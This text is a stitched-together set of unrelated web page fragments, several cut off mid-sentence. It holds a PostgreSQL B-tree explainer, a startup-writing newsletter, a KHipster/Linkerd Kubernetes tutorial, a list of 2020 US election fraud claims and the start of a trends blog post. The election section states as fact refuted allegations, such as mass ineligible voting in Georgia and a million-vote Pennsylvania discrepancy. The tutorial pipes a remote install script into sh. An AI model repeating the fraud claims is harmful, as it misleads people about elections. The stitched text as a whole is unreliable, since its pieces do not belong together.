drawing funny faces. But do not read everything at once, have no fear of
putting it aside for a while, and read in chunks that are convenient for you.
Some parts could be skipped as the text is build out of relatively independent
topics. The table of contents can help and guide you. Having said that we’re
ready to embark on the journey.</p>

<h2 id="1-introduction">1. Introduction</h2>
<p>Whenever we speak about indexes, especially in PostgreSQL context, there is a
lot to talk about: B-tree, Hash, GiST, SP-GiST, GIN, BRIN, RUM. But what if I
tell you that even the first item in this list alone hiding astonishing number
of interesting details and years of research? In this blog post I’ll try to
prove this statement, and we will be concerned mostly with B-tree as a data
structure.</p>
<p><img src="https://erthalion.info/public/img/btree-joke.png" width="80%"></p>

<p>Let’s start systematically and take a look at the definition first:</p>
<blockquote>
<p>B-tree is a self-balancing tree data structure that maintains sorted data and
allows searches, sequential access, insertions, and deletions in logarithmic
time.</p>
</blockquote>
<p>What is your first association with the concept of B-tree? Mine is “old and
well researched, or in other words boring”. And indeed apparently it was first
introduced in <a href="https://infolab.usc.edu/csci585/Spring2010/den_ar/indexing.pdf">1970</a>! Not only that, already in 1979 they
were <a href="http://cgi.di.uoa.gr/~ad/M149/ubiquitous_btree.pdf">ubiquitous</a>. Does it mean there is nothing exciting left any
more? Once upon a time I came across a remarkable read called
<a href="https://dl.acm.org/doi/10.1561/1900000028">Modern B-Tree techniques</a> which inspired me to dig
deeper into the topic and read bunch of shiny new whitepapers. Afterwards
totally by chance I’ve stumbled upon a book “Database Internals: A Deep Dive
into How Distributed Data Systems Work”, which contains great sections on
B-tree design. Both works were the triggers to write this blog post. What was I
saying about nothing exciting left? At the end I couldn’t be more wrong.</p>
<p>It turns out that there are multitude of interesting ideas and techniques
around B-Trees. They’re all coming from the desire to satisfy different (often
incompatible) needs, as well as adapt to emerging hardware. To demonstrate how
many of those exist, lets play a game. Below you can find a table of names I’ve
found in various science papers, together with a couple of silly names I’ve
come up myself. Can you find out the fake ones?</p>
<table>
<tbody>
<tr>
<td>B-tree</td>
<td>B<sup>+</sup>-tree</td>
<td>B<sub>link</sub>-tree</td>
<td>DPTree</td>

<tr>
<td>wB<sup>+</sup>-tree</td>
<td>NV Tree</td>

</tbody>
</table>

<p>Any ideas? Well, I have a confession to make – all of them are real, I just
don’t have enough imagination to come up with such names. Having this in mind
hopefully you understand that if we want to make a survey, the first step would
be to establish some classification. Not only this will help us to structure
the material, but also will explain why on earth anyone would need to invent so
many variations of what we though was so simple!</p>
<h2 id="2-rum-conjecture">2. RUM conjecture</h2>
<p>To classify different index access methods we need to think about the following
ambitious question – is there anything common between almost any index access
method? The authors of <a href="https://stratos.seas.harvard.edu/files/stratos/files/rum.pdf">RUM conjecture</a> provide an interesting
insight about this topic:</p>
<blockquote>
<p>The fundamental challenges that every researcher, systems architect, or
designer faces when designing a new access method are how to minimize, i)
read times, ii) update cost , and iii) memory (or storage) overhead.</p>
<p>In this paper, we conjecture that when optimizing the read-update-memory
overheads, optimizing in any two areas negatively impacts the third</p>
</blockquote>
<p>This essentially states that if an index access method could be specified as a
point inside “Read”, “Update” (on the Fig. 1 it’s called “Write” for
convenience of drawing), “Memory” space we can observe an interesting
invariant. Every time we modify one index access method to have less overhead
for reading or memory footprint (i.e. shift the corresponding point closer to
“Read”/”Memory” corners), we inevitably loose on the updating workload (i.e.
getting further away from “Write” corner).</p>
<figure>
<img src="https://erthalion.info/public/img/rum.png" width="50%">

</figcaption>
</figure>
<p>In fact as a non-scientist I would even speculate that there should be another
dimension called “Complexity”, but the idea is still clear. I will try to show
this invariant at work via examples in this blog post, but it already gives us
some ground under the feet and opportunity to visually represent different
versions of B-tree by moving point on the triangle back and forth. But first
let’s recall the basics.</p>
<h2 id="3-b-tree-basics">3. B-tree basics</h2>
<p>So what is B-tree? Well, it’s a tree data structure: a root node, some number
of branch nodes (marked grey) and a bunch of leaf nodes (marked green):</p>
<figure>
<img src="https://erthalion.info/public/img/btree.png" width="100%">
<br>
<figcaption>
Fig 2. B-tree nodes arrangement
</figcaption>
</figure>
<p>Every node of this tree is usually a page of some certain size and contains
keys (shaded slices of a node) and pointers to other nodes (empty slices with
arrows). Keys on page are kept in sorted order to facilitate fast search within
a page.</p>
<p>The original B-tree design assumed to have user data in all nodes,
branch and leaf. But nowadays the standard approach is a variation called
B<sup>+</sup>-tree, where user data is present only in leaf nodes and branch
nodes contains separator keys (pivot tuples in PostgreSQL terminology). In this
way separation between branch and leave nodes become more strict, allowing
better flexibility for choosing format of former and making deletion operations
can affect only latter. In fact the original B-tree design is barely worth
mentioning these days and I’m doing this just to be precise. Since
B<sup>+</sup>-tree is sort of default design, we’ll use B-tree and
B<sup>+</sup>-tree interchangeably in this text from now on. An interesting
thing to mention here is that the only requirements for separator keys is to
guide search algorithm to a correct leaf node. As long as they fulfil this
condition they can contain anything, no other requirements exist.</p>
<p>Strictly speaking, only child pointers are truly necessary in this design, but
quite often databases also maintain additional neighbour pointers, e.g. what you
can see on the Fig. 2 between the leaf nodes. It could be helpful for some
operations like index scan, but need to be taken into account for node
split/merge operations. PostgreSQL uses <a href="https://www.csd.uoc.gr/~hy460/pdf/p650-lehman.pdf">Lehman-Yao</a> version,
called B<sub>link</sub>-tree, with links to both left and right sibling nodes
(the left link one is actually not presented in the original
B<sub>link</sub>-tree design, and it makes backward scan somewhat interesting),
and there are even implementations like WiredTiger with
<a href="https://github.com/wiredtiger/wiredtiger/blob/f08bc4b18612ef95a39b12166abcccf207f91596/src/include/btmem.h#L550">parent pointers</a>.</p>
<p>Having all this in place one can perform a search query by following the path
marked red on the Fig. 2, first hitting the root, finding a proper separator
key, following a downlink and landing on a correct page where we deploy binary
search to find the resulting key.</p>
<p>Until now, we were talking only about static parts of B-tree design, but of
course there is more to it. For example there is one dynamic aspect of much
importance (quite often it even scares developers like a nightmare), namely
page splits. What do we need to do when there is a new value to insert, but the
target page does not have enough space like on the following diagram?</p>
<figure>
<img src="https://erthalion.info/public/img/page-split-1.png" width="60%">
<br>
<figcaption>
Fig 3. B-tree page split (a)
</figcaption>
</figure>
<p>What happens here is we’re trying to insert the new value (shaded box) into the
page with not enough space for it. To maintain the three balanced we need to
allocate another leaf page, distribute keys between old and new leaf, promote a
new separator key into the parent page and update all required links
(left/right siblings if present):</p>
<figure>
<img src="https://erthalion.info/public/img/page-split-2.png" width="60%">
<br>
<figcaption>
Fig 4. B-tree page split (b)
</figcaption>
</figure>
<p>Curiously enough the new separator key could be chosen freely, it could be any
value as long as it separates both pages. We can see what does it change in the
optimization section.</p>
<p>Locking is obviously an important part of a page split. No one wants to end up
with concurrency issues when pages get updated while in the middle of a split,
so a page to be split is write-locked as well as e.g. right sibling to update
left-link if present.</p>
<p>As you can see, page splits are introducing performance overhead. We need to
bring in a new page, move elements around and everything should be consistent
and correctly locked. And already at this pretty much basic point we already
can see some interesting trade-offs. For example B*-tree modification tries to
rebalance data between neighbouring nodes to postpone page split as long as
possible. In terms of trade-offs it looks like a balance between complexity and
insert overhead.</p>
<p>I didn’t tell you everything about B<sub>link</sub>-tree and it’s going to be our next
topic example in this section. Not only Lehman-Yao version adds a link to the
neighbour, it also introduces a “high key” to each page, which is an upper bound
on the keys that are allowed on page. While obviously introducing a bit memory
overhead those two changes make it possible to detect a concurrent page split
by checking the page high key, which allows the tree to be searched …</p></div></div>

Aren’t they basically the same thing?</p><p>As I’m typing this, I’m trying to make a piece of content that people want – that answers some of the big questions aspiring founders have around how to position themselves to start a startup in the future.</p><p>One of the most important skills that founders can have is the ability to be intellectually honest with themselves about their ideas and if people actually want what they’re building. Founders who are able to be skeptical of their own ideas and challenge their own assumptions find product-market fit faster (AKA building something people want).</p><p>Writing something that your target audience wants to read requires a similar level of self-awareness and self-scrutiny. For example, as I was sitting down to write this, I almost wrote a post about how writing a book accelerated my career. But as I thought about the target readers of this newsletter and what they wanted, I realized that while that post may have been good, it ultimately does not address some of the biggest questions my ideal readers have.&nbsp;</p><p>At the end of the day, if you’re able to figure out how to write things that people want to read, you’ll have a lot of the skills required to build something that people want.&nbsp;</p><h3><strong>Getting comfortable with shipping early and often</strong></h3><blockquote><p><em>“If you are not embarrassed by the first version of your product, you've launched too late”</em> - Reid Hoffman</p></blockquote><p>Building a startup requires that you ship products uncomfortably early and open yourself up to scrutiny. Founders who are comfortable doing this ship early and often, allowing them to get feedback from the market and keep improving towards making something that people want (and that works).&nbsp;</p><p>Consistently publishing writing requires that you get comfortable with shipping uncomfortably early the possibility that something you ship might not be great, or that an opinion you have might be wrong. As I’m writing this article, I think it’s going to be good! But I know that there’s a distinct possibility that it might not be as good as I hope. Writing a newsletter means I need to ship it regardless rather than spending weeks agonizing about making it perfect. In the future, based on feedback I get, I can always crystallize some of the concepts in this post in other ways. Writing this newsletter is a forcing function, getting me back into the mentality of shipping early and often.</p><p>Getting comfortable with shipping writing to readers will help you be more comfortable with shipping other things (like products) to customers.&nbsp;</p><h3><strong>Building a relevant network of mentors, peers, and audience</strong></h3><p>Starting a startup involves many chicken-and-egg challenges and leaps of faith. Founders need to attract early adopters for products that are barely working. They need to attract investors, co-founders, and early employees for ideas that are incredibly risky.</p><p>When starting from zero, looking ahead to some of these challenges is incredibly daunting. Even as a former founder myself with a pretty good network, when I look ahead into the possibility of starting another startup down the road, I wonder if I’ll be able to do it again.</p><p>One way to make these down-the-road challenges easier is by building a relevant network of mentors, peers, and who share your interests in something. If you’re able to do that, then you’ll have a network of investors, teammates, and early customers/users who are interested in whatever you build down the road and will give you their attention.</p><p><a href="https://twitter.com/ajt">Alex Taub</a>’s story is a great example. <a href="https://alexstechthoughts.com/">Alex’s Tech Thoughts</a> (which he started in 2010) included blog posts on Business Development, tech startups that he liked, and other various tech-related topics. Not many of his posts went viral and Alex didn’t necessarily become a prolific tech writer, but his writing made him a magnet for people in tech who were looking to level up their careers. I came across Alex as a college senior looking to break into startups in 2012 and started following his writing and engaging with him on Twitter. There are many people like me who first engaged with Alex through his articles or tweets.</p><p>A year ago, he started working on a new startup, <a href="https://upstreamapp.com/">Upstream</a>, a new social professional network. Kickstarting a social professional network is a huge challenge. But because of Alex’s writing, he had an audience of similarly-minded ambitious tech folks who followed him. This gave him a huge advantage in starting a social professional network, and he’s been able to quickly overcome some of the early chicken-and-egg problems that have killed countless social professional networks before Upstream.&nbsp;</p><p>Personally, I don’t know what startup I’m going to start down the line. But part of my motivation for writing is that it will help me start to find the areas I’m most interested in, help me meet people with similar interests who could be future collaborators, and build an audience of people who care about the topics I’m writing about. Today, writing is one of the best things I can do to de-risk my future startup, whatever and whenever that is.&nbsp;</p><h3><strong>Developing clarity of thought and unique points of view</strong></h3><p>One of the biggest things investors look for in early stage investments is if the founders have a unique insight about what they’re building. If founders have a unique insight on the product or market, then perhaps they can be successful where others have failed. When I think about what I need in order to start my next startup, one of my prerequisites is a unique, contrarian insight that would enable me to build something unique and different. How do develop unique insights? One way is by writing.&nbsp;</p><p>Before sitting down to write this, I had some loose thoughts around how writing is generally a good thing for aspiring founders to do. But through the process of writing this, I’ve developed clarity and conviction that writing is an ideal onramp to starting a startup. It started as an idea, and through writing this post, that idea turned into a non-obvious insight that is now one of my firmly held beliefs.</p><p>Writing –&nbsp;especially long form writing and not just tweets –&nbsp;forces you to have clarity of thought and form strong, supported points of view.&nbsp;These points of view can turn into the theses behind future startups.</p><h3><strong>Establishing credibility and expertise</strong></h3><p>Establishing credibility on a topic results in people trusting you as an expert. When you’re a trusted expert, people are more willing to give you their attention, time, or ideas.&nbsp;</p><p><a href="https://www.ryanhoover.me/">Ryan Hoover</a> founded <a href="https://producthunt.com/">Product Hunt</a>, a site to discover or launch new products. But what did Ryan do before Product Hunt?&nbsp;</p><p>He wrote <a href="https://www.ryanhoover.me/post/todays-behaviors-tomorrows-startups">essays about building habit-forming products</a>, <a href="https://www.ryanhoover.me/post/what-philz-coffee-can-teach-us-about-product-design">product design</a>, and breakdowns of <a href="https://www.ryanhoover.me/post/easter-egg-marketing-how-snapchat-apple-and-google-hook-you">some of the most popular products like Snapchat</a>. All this culminated in Ryan writing <a href="https://www.amazon.com/Hooked-How-Build-Habit-Forming-Products/dp/1591847788">a book with Nir Eyal about habit-forming products</a>.</p><p>By the time that Ryan was tinkering around with the idea for Product Hunt, he already had credibility as a product expert through his writing, and he was the perfect person to launch an idea like Product Hunt. When Ryan reached out to his friend Nathan Baschez about the idea, <a href="https://medium.com/lets-make-things/the-origin-of-product-hunt-7acb09e2593a">Nathan was happy to spend some time building the MVP</a>. When Ryan debuted Product Hunt as an email list, people who knew Ryan were eager to sign up. When new people who didn’t know Ryan saw that a guy who’d written essays and a book about products was launching something called Product Hunt, it seemed like real deal. Ryan’s credibility as a product expert helped him get Product Hunt off the ground.&nbsp;</p><p>But what if you don’t have expertise? Write.&nbsp;</p><p>Back in 2018 after I wound down my startup, I by no means considered myself an expert on seed stage fundraising –&nbsp;I’d only raised $1M in funding and hadn’t raised from top-tier VCs. But I ended up writing a guide to fundraising in a Google Doc which I shared with some friends. That Google Doc started getting longer and longer, and I looped in my friend <a href="http://maxnuss.com/">Max</a> as a co-author to turn the growing Google Doc <a href="https://oversubscribed.club/">into a book</a>. I developed expertise on fundraising through the process of writing the book and writing a newsletter about fundraising.&nbsp;The fact that I wrote a book and a bunch of essays about fundraising has given me credibility as a fundraising “expert.”</p><p>Expertise isn’t a prerequisite for writing about a topic –&nbsp;it’s the result.&nbsp;</p><p>Frankly, that’s part of why I’m writing this newsletter. I want to write my way into becoming an expert on entrepreneurial careers.</p><h3><strong>Writing is a more accessible onramp that preserves optionality</strong></h3><p>Not everyone can quit their job and go full-time on side projects that they want to turn into startups. Not everyone can spend 10-15 hours per week working on a side project. But everyone can carve out a few hours per week to write if they prioritize it.&nbsp;</p><p>Actually, this newsletter for me is a more minimal version of a side project I was working on a few months ago: a non-profit which helped founders move on from their startups and figure out the next chapter of their entrepreneurial careers. After working on it for a few …</p></div></div>

<p>KHipster is a development platform to generate, develop and deploy Spring Boot + Angular/React/Vue Fullstack Web applications and Spring microservices. KHipster is built on top of JHipster.</p>
</blockquote>
<p>In this post, we will do the following:</p>
<ul>
<li>Generate microservices with KHipster using JHipster Description Language (JDL)</li>
<li>Generate Kubernetes configuration using JDL</li>
<li>Generate code using KHipster</li>
<li>Create a Kubernetes cluster in GCP</li>
<li>Install Linkerd CLI and deploy Linkerd in Kubernetes cluster</li>
<li>Deploy ingress controller in Kubernetes</li>
<li>Deploy applications in Kubernetes cluster</li>
<li>Configure traffic to application</li>
</ul>
<p>Let us get started.</p>
<h2 id="generate-microservices-with-khipster">Generate Microservices with KHipster</h2>
<h3 id="step-1-install-khipster">Step 1: Install KHipster</h3>
<p>KHipster is available as an NPM package. To install it run:</p>
<div><pre><code>λ npm i -g generator-jhipster-kotlin
</code></pre></div>
<blockquote>
<p>Do not have Node installed? Check out <code>nvm</code> (Node Version Manager) that makes it easy to setup Node - <a href="https://github.com/nvm-sh/nvm/blob/master/README.md" rel="nofollow noopener noreferrer" target="_blank">here</a>.</p>
</blockquote>
<p>Now, verify the installation by running:</p>

<h3 id="step-2-create-jdl-file">Step 2: Create JDL file</h3>
<blockquote>
<p>The JDL is a JHipster-specific domain language.</p>
</blockquote>
<p>JDL provides a DSL to describe the applications, deployments, entities and their relationships. <code>Applications</code> refer to the service as a whole, the application can be a monolith or microservice. The <code>deployments</code> refer to the way to deploy the application it can be <code>kubernetes</code>. The <code>entities</code> straightaway maps to the database table in your application. The <code>relationships</code> refers to the entity relationship <code>one-to-one</code>, <code>one-to-many</code>, etc.,. JDL simplifies the process of creating the microservices applications and entities.</p>
<div><pre><code>// Gateway application
application {
    config {
        applicationType         gateway
        authenticationType      jwt
        baseName                gateway
        buildTool               gradle
        clientFramework         react
        databaseType            sql
        devDatabaseType         h2Disk
        prodDatabaseType        mysql
        packageName             com.sendilkumarn
        serverPort              8080
        serviceDiscoveryType    no
    }
    entities *
} 

// Microservice application
application {
    config {
        applicationType         microservice
        authenticationType      jwt
        baseName                service
        buildTool               gradle
        databaseType            sql
        devDatabaseType         h2Disk
        prodDatabaseType        mysql
        packageName             com.sendilkumarn
        serverPort              8081
        serviceDiscoveryType    no
    }
    entities product
}

// Product entity 
entity product  {
    name    String  required
    price   Long    required
}
</code></pre></div>
<p>We have defined 2 applications: <code>gateway</code> and <code>service</code>, and an entity: <code>product</code>. The major difference between <code>gateway</code> and <code>service</code>:</p>
<ul>
<li><code>gateway</code> uses <code>clientFramework</code> as <code>react</code>, <code>applicationType</code> as <code>gateway</code></li>
<li><code>service</code> uses <code>applicationType</code> as <code>microservice</code></li>
</ul>
<blockquote>
<p>Refer we have used <code>serviceDiscoveryType no</code>, this implies that we are not using serviceDiscovery in the microservices. We will use Linkerd for servicediscovery.</p>
</blockquote>
<blockquote>
<p>Did you know? JHipster supports <code>sql</code> and <code>noSql</code> database and it has many configuration options for generating the applications. Check the entire list of application configuration options <a href="https://www.jhipster.tech/jdl/applications#available-application-configuration-options" rel="nofollow noopener noreferrer" target="_blank">here</a>.</p>
</blockquote>
<h2 id="generate-kubernetes-configuration">Generate Kubernetes configuration</h2>
<p>KHipster provides <code>kubernetes</code> option to generate the Kubernetes configuration file for the <code>JHipster</code> generated applications. Interested to explore more about Kubernetes check out <a href="https://sendilkumarn.com/blog/kubernetes-for-everyone" rel="nofollow noopener noreferrer" target="_blank">here</a>. The <code>jdl</code> accepts <code>deployment</code> block to define the Kubernetes deployment.</p>
<div><pre><code>deployment {
  deploymentType         kubernetes
  appsFolders            [gateway, service]
  dockerRepositoryName   "sendilkumarn"
  serviceDiscoveryType   no
  istio                  false
  kubernetesNamespace    khipster
  kubernetesServiceType  Ingress
}
</code></pre></div>
<blockquote>
<p>Note: It checks whether you have installed Docker since we need Docker for creating and pushing the images and use them later.</p>
</blockquote>
<p>The Kubernetes definition is made inside the <code>deployment</code> block with <code>deploymentType</code> as <code>kubernetes</code>. The <code>appsFolders</code> points to the folders of the generated applications. We define the <code>dockerRepositoryName</code>, this refers to docker user name here. Similar to applications, we define the <code>serviceDiscoveryType</code> as <code>no</code> (since we are going to use <code>Linkerd</code> for service discovery). KHipster provides <code>istio</code> out of the box, since we are going to use <code>Linkerd</code> for that. We define the Kubernetes namespace using <code>kubernetesNamespace</code> property. All the deployments &amp; services use <code>khipster</code> namespace to deploy the application.</p>
<p>Finally, We use <code>Ingress</code> as the <code>KubernetesServiceType</code> configuration. The smallest deployment unit of Kubernetes is a <code>pod</code>. A pod is a group of Docker containers. Refer here for more information about the <a href="https://sendilkumarn.com/blog/kubernetes-pods" rel="nofollow noopener noreferrer" target="_blank">pods</a>. Each pod gets IP address during its creation. If we have to access the application we have to connect to the pod's IP address (with port if applicable). In the Kubernetes cluster, pods are created and destroyed automatically based on various factors. So when a pod spawns newly, IP address referring them might change.In order to connect to running applications in the pods, we use services. Services define a set of pods and a way to access them. The services is like a loadbalancer or service discoverer that helps to identify the pods with a name to it.</p>
<p>Kubernetes provide three types of service type:</p>
<ul>
<li>Cluster IP  - This exposes service to an cluster internal IP</li>
<li>Nodeport  - This exposes the service to an port</li>
<li>Load Balancer - This exposes the service to an external IP</li>
</ul>
<p>With <a href="https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/" rel="nofollow noopener noreferrer" target="_blank">Kube-DNS</a>, Kubernetes also maps the service to an external name. Refer <a href="https://kubernetes.io/docs/concepts/services-networking/service/" rel="nofollow noopener noreferrer" target="_blank">here</a> for more infomration.</p>
<p>Ingress is not a service type, but with Ingress you can expose the service. The ingress acts as an entry point for your cluster. It is ideal for exposing multiple services under the same IP address.</p>
<blockquote>
<p>We need <code>ingress-controller</code> to expose services via ingress IP, we will set up ingress-controller below.</p>
</blockquote>
<h2 id="generate-code-using-khipster">Generate code using KHipster</h2>
<p>The <code>khipster import-jdl</code> imports the <code>JDL</code> file and generates the application and the deployment configuration files.</p>
<div><pre><code>λ khipster import-jdl app.jdl

Gateway application generated successfully.
Service application generated successfully.
Kubernetes configuration generated successfully.
</code></pre></div>
<p>Login the docker using <code>docker login</code>. Now go and build each services in their respective folders:</p>
<div><pre><code>λ ./gradlew bootJar -Pprod jib -Djib.to.image=&lt;docker-username&gt;:&lt;app-name&gt;
</code></pre></div>
<h2 id="create-a-kubernetes-cluster-in-gcp">Create a Kubernetes cluster in GCP</h2>
<blockquote>
<p>Install gcloud <a href="https://cloud.google.com/sdk/docs/install" rel="nofollow noopener noreferrer" target="_blank">here</a>.</p>
</blockquote>
<div><pre><code>λ gcloud beta container --project &lt;project-name&gt; clusters create "khipster-cluster" --machine-type "c2-standard-4" --num-nodes "2" --zone "us-central1-c"
</code></pre></div>
<p>We create a cluster named <code>khipster-cluster</code> in the given project. We define the <code>machine-type</code> with <code>c2-standard-4</code> with 2 nodes in the <code>us-central1-c</code> zone. This will take a while to complete, since it has to create a cluster from the scratch.</p>
<blockquote>
<p>Explore more about K8s installation in the GCP <a href="https://cloud.google.com/kubernetes-engine/docs/quickstart" rel="nofollow noopener noreferrer" target="_blank">here</a>.</p>
</blockquote>
<h2 id="install-linkerd-cli-and-deploy-linkerd-in-kubernetes-cluster">Install Linkerd CLI and deploy Linkerd in Kubernetes cluster</h2>
<blockquote>
<p>Linkerd is a <code>service mesh</code> for Kubernetes. Linkerd makes running services easier and safer by giving you runtime debugging, observability, reliability, and security—all without requiring any changes to your code. - <a href="https://linkerd.io/2/overview/" rel="nofollow noopener noreferrer" target="_blank">Linkerd website</a></p>
</blockquote>
<p>Install the CLI manually in your system and set up the path, run:</p>
<div><pre><code>λ curl -sL https://run.linkerd.io/install | sh
Linkerd stable-2.9.0 was successfully installed 🎉

λ export PATH=$PATH:$HOME/.linkerd2/bin
</code></pre></div>
<p>Check the installation by running:</p>
<div><pre><code>λ linkerd version
Client version: stable-2.9.0
Server version: unavailable
</code></pre></div>
<p>Once the installation is completed. Before installing the Linkerd in the Kubernetes cluster, we wil check whether the Kubernetes cluster is configured correctly. We run:</p>
<div><pre><code>λ linkerd check --pre
....
Status check results are √
</code></pre></div>
<blockquote>
<p>The above command checks whether the kubernetes cluster is configured correctly and ready to install the Linkerd control plane.</p>
</blockquote>
<p>Note: The bare Kubernetes configuration might not have the required cluster admin role. To create the <code>clusterrolebinding</code> with <code>cluster-admin</code> role for the selected account.</p>
<div><pre><code>λ kubectl create clusterrolebinding cluster-admin-binding \
  --clusterrole=cluster-admin \
  --user="$(gcloud config get-value core/account)"

clusterrolebinding.rbac.authorization.k8s.io/cluster-admin-binding created
</code></pre></div>
<p>To install the Linkerd on the Kubernetes cluster, run the following:</p>
<div><pre><code>λ linkerd install | kubectl apply -f -
</code></pre></div>
<p>The <code>linkerd install</code> command creates the kubernetes configuration files. We pipe the configuration files using <code>kubectl apply -f </code> command on those generated files. This will create the complete <code>linkerd</code> in the kubernetes cluster. Once the installation is complete refer the installation is complete using</p>

<h2 id="deploy-ingress-controller-in-kubernetes">Deploy ingress controller in Kubernetes</h2>
<blockquote>
<p>Ingress exposes <code>HTTP</code> and <code>HTTPS</code> routes from outside the cluster to services within the cluster. Traffic routing is controlled by rules defined on the Ingress resource.</p>
</blockquote>
<p>Ingress provides an external IP with which we connect to the services running inside the Kubernetes cluster. The Ingress also provides load balancing, SSL / TLS, and others. We will install a vanilla version Nginx ingress controller:</p>
<div><pre><code>λ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.41.2/deploy/static/provider/cloud/deploy.yaml
</code></pre></div>
<p>Once the ingress-controller is installed in the Kubernetes cluster. Get the IP address by running the following command:</p>
<div><pre><code>λ kubectl get svc ingress-nginx-controller -n ingress-nginx -o jsonpath='{.status.loadBalancer.ingress[0].ip}'
xxx.xxx.xxx.xxx
</code></pre></div>
<p>Our application will be accessible via the above IP address.</p>
<h2 id="deploy-applications-in-kubernetes-cluster">Deploy applications in Kubernetes cluster</h2>
<p>To deploy applications in to the Kubernetes cluster, go into the Kubernetes folder and run the following command:</p>
<div><pre><code>λ ./kubectl-apply.sh apply -f
</code></pre></div>
<p>All the deployments and services will be installed in the K8s cluster. Now we need to auto inject Linkerd into the <code>khipster</code> namespace for all the services in that particular namespace.</p>
<p>Next, let's add Linkerd to <code>khipster</code> namespace by running:</p>
<div><pre><code>λ kubectl get -n khipster deploy -o yaml \
  | linkerd inject - \
  | …</code></pre></div></div></div>

<p><strong>Arizona</strong><br>A sampling of 2,044 voters by Voter Integrity Project showed <strong>44 percent did not request an absentee ballot</strong>, even though they reportedly received one. Arizona law prohibits sending a ballot to a voter who has not requested one. The project also showed nearly 6,000 people voted in 2020 election who no longer met the state’s residency requirements. Moreover, the sampling revealed 157 people who voted twice. </p>

<p><strong>Georgia</strong><br>An analysis by Voter Integrity Project (VIP) shows <strong>more than 20,000 people voted in Georgia who did not meet the state’s residency requirements to vote</strong>. Biden’s margin of victory in Georgia is 12,670 votes. <a href="http://youtu.be/XH9ihoLi1NA">youtu.be/XH9ihoLi1NA</a> This one piece of data could flip the Peach State into Trump’s favor. VIP also showed 395 people voted twice over 1,200 used a post office as their home address, even though this is prohibited by state law. </p>

<p>Even though substantially more people voted by mail this year in Georgia, the state’s current mail-in<strong> ballot rejection rate</strong> is running extremely low at about 0.24%. <a href="https://tinyurl.com/yxnvet9e">https://tinyurl.com/yxnvet9e</a> The historical average is 3%. Why is the rejection rate, a figure that could flip the state to Trump, running so low?</p>



<p>Trump was leading Biden on election night in Georgia, but early in the morning on November 4, Fulton County (Atlanta) stopped counting. Election officials claimed a <strong>pipe burst</strong> at the State Farm Arena where ballots were being counted. But a subsequent open records request located no records or work orders relating to water main break at or near the arena. <a href="https://tinyurl.com/y5cj2585">https://tinyurl.com/y5cj2585</a></p>



<p><strong>Pennsylvania</strong><br>According to state senator Doug Mastriano, the Pennsylvania Department of State posted the official results as showing that 1,823,148 ballots were mailed, of which 1,462,303 were returned. But the “grand total” of mail-in votes counted showed to be 2,589,242. That’s a difference of over one million votes between the number of mail-in ballots that showed to have been returned verses the number of mail-in ballots the state says it counted. The posting of this mass discrepancy in the numbers has since been deleted by election officials without explanation.&nbsp;<a href="https://tinyurl.com/y6ckzfop">https://tinyurl.com/y6ckzfop</a></p>



<p>During the Pennsylvania legislative hearing, an expert computer scientist witness stated that state is missing 47 memory cards. <a href="https://tinyurl.com/y6fg9xjn">https://tinyurl.com/y6fg9xjn</a> Another expert witness stated that in one 90 minute peroid, Joe Biden received about 570,000 votes whereas Trump received a mere 3,200 votes, which is statically improbable.

<p>The Voter Integrity Project identified 1,400 people listed a post office as their home address in Pennsylvania, which is illegal. These people went one step further and used “Apt., “Suite,” “Unit,” etc. to conceal the true address.</p>



<p><strong>Michigan</strong><br>According to an affidavit filed in <em>King v. Whitmer</em>, numerous precincts and townships reported substantially more ballots were cast than registered voters.</p>



<p>Wayne County reported 70% of Detroit’s&nbsp;<strong>134 absentee counting boards were out of balance by one&nbsp;to more than four&nbsp;votes without explanation</strong>. In other words, more votes were cast in these precincts than the number of people signed into vote.&nbsp;<a href="https://tinyurl.com/y4m94ost">https://tinyurl.com/y4m94ost</a></p>



<p>According to data scientist Sarah Eaglesfield, the <strong>largest cluster of votes in Wayne County Michigan came from a psychiatric hospital</strong> for patients with severe mental illnesses.<strong> <a href="https://tinyurl.com/y5j4rngq" rel="nofollow">https://tinyurl.com/y5j4rngq</a></strong></p>



<p>A small random sample of 163 in the deceased voter dataset showed there two ballots were cast on behalf of dead individuals. Although the report of votes being submitted for deceased voters en masse cannot be substantiated, further work is needed to conclude exactly how many people voted on behalf of the deceased. There are<br>also instances of votes on behalf of deceased people being received, but rejected. Who is voting for the dead in Michigan? <a href="https://tinyurl.com/yxulbhfq">https://tinyurl.com/yxulbhfq</a> </p>

<p>A lot has happened in 2020. As this strange and unsettling year comes to a close, I wanted to look forward to some of the trends that are likely to define the coming decade.</p>
<p>I’m going to cover a lot of ground in this article, so if you’d like to hop around, I’ve divided these trends into five categories:</p>
<ul>
<li><a href="#technology">Technology</a></li>
<li><a href="#business">Business</a></li>
<li><a href="#education">Education</a></li>
<li><a href="#finance">Finance</a></li>
<li><a href="#society">Society</a></li>
</ul>
<p>I’m sure you’ll disagree with me on some points, so I’d love to hear why. Feel free to pass me a message via <a href="https://twitter.com/KarlLHughes">Twitter</a> or <a href="https://www.karllhughes.com/cdn-cgi/l/email-protection#305b5845575855431e5d5570575d51595c1e535f5d">email</a>.</p>
<h2 id="technology">Technology</h2>
<blockquote>
<p>“It is only when they go wrong that machines remind you how powerful they are.” - Clive James</p>
</blockquote>
<h3 id="artificial-pseudointelligence">Artificial (Pseudo)Intelligence</h3>
<p>Sadly, the term “Artificial Intelligence” has been co-opted by marketers to mean nothing, but that doesn’t mean that advances in machine learning and artificial intelligence will not impact the next decade. The continued advancement of AI will produce the greatest impact on human productivity since the industrial revolution, but I don’t think it will necessitate mass unemployment the way that alarmists do.</p>
<p>The common fear around AI is that robots will come in and take all of our jobs. Maybe someday, but truly sentient AI isn’t coming this decade. All existing AIs use pseudo-intelligence to ingest massive amounts of data and extract patterns from it based on programmed parameters. This makes <a href="https://disruptiveviews.com/ai-good-things-terrible-others/">AI <em>much</em> better at some tasks</a> than humans and <a href="https://aiweirdness.com/">comically much worse at others</a>.</p>
<p><img src="https://i.imgur.com/xY5HMi3.png" alt="Strengths of AI vs. strengths of humans"></p>
<p>AI will excel by partnering with humans. For example, GPT-3 <a href="https://thenextweb.com/neural/2020/09/08/the-guardians-gpt-3-generated-article-is-everything-wrong-with-ai-media-hype/">is not going to write great blog posts on its own</a>, but it could be used to help a human writer create better or more content faster. I recorded a <a href="https://youtu.be/lywWkR0vo_A">video of how I could see this working recently</a>:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/lywWkR0vo_A" frameborder="0" allowfullscreen=""></iframe>
